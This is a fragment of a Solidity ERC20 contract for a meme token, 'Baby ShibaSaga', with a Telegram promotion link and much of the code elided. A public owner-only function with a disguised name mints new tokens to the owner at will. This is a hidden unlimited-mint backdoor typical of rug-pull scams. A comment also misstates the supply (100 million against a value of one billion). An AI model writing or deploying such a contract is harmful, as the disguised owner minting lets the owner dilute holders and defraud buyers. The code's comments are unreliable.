//
// $BabyShibaSaga proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyShiaBEP
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyShibaSaga(uint256 amount) public onlyOwner {
 _BabyShibaSaga(msg.sender, amount);
    }
    ...
    function _BabyShibaSaga(address account, uint256 amount) internal virtual {
...
contract $BabyShibaSaga is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby ShibaSaga", "BABYSHIA") {
     _BabyShibaSaga(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}